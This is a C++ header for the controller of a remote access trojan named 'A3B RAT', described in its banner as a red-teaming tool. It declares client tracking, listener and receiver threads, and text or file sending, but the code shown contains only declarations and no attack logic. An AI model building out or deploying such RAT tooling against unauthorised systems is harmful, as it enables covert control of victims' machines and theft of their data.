#pragma once
//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>

//-- Other headers.
#include "sEncryption.h"

//--Standard includes.
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <thread>
#include <fstream>

#define MAX_BUF (1024*10)

enum sendcode
{
	none, text, file
};


typedef struct connectedClient
{
	std::string name;
	std::string ipAddress;
	unsigned int id;
	char isActive = 0;
	std::string installed_exe_path;

	connectedClient(char*, char*, unsigned int);

	void __cdecl setIsActive(char);
};

void __cdecl outputColor(int);
void __cdecl sendInfoToClient(unsigned int, char*, int);


class Controller
{
public:
	std::string ipv4ADDR;
	unsigned int activeClient;
	unsigned int socketPort;
	std::vector<connectedClient> allConnectedClients;
	std::vector<std::thread> threads;

	static void __cdecl listenForClients(int, unsigned int*, std::string*, std::vector<connectedClient>*, std::vector<std::thread>*);

	const char* __cdecl _startText()
	{
		return startText;
	};
private:
	static void __cdecl recvThings(connectedClient, std::vector<connectedClient>*);

	const char* startText =
		"		                   **          ****      ******			\n"
		"		                  ****        */// *    /*////**			\n"
		"		                 **//**      /    /*    /*   /**			\n"
		"		                **  //**        ***     /******			\n"
		"		               **********      /// *    /*//// **			\n"
		"		              /**//////**     *   /*    /*    /**			\n"
		"		              /**     /**    / ****     /*******			\n"
		"		              //      //      ////      ///////			\n\n"
		"A3B RAT is a Remote Access Trojan developed using C++ which is used for red teaming and penetration testing purposes\n"
		"this tool is intended for ethical use only,such as red teaming and penetration testing engagements.\nThe use of this tool for any illegal or malicious purposes is strictly prohibited.\nThe author of this tool is not responsible for any damages or legal issues that may arise from the use of this tool.\n\n"
		"Type 'help' for quick docs.\n";
};
